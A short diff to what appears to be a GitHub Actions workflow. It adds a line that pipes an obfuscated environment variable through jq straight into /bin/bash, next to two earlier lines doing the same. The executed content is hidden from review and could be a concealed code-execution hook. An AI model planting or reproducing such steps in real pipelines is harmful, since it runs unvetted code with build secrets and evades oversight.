@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$ikgw795" | jq -r .mejsa05154 | /bin/bash
           echo $rmt4691 | jq -r .l42 | /bin/bash
+          echo $zg12 | jq -r .c1352 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
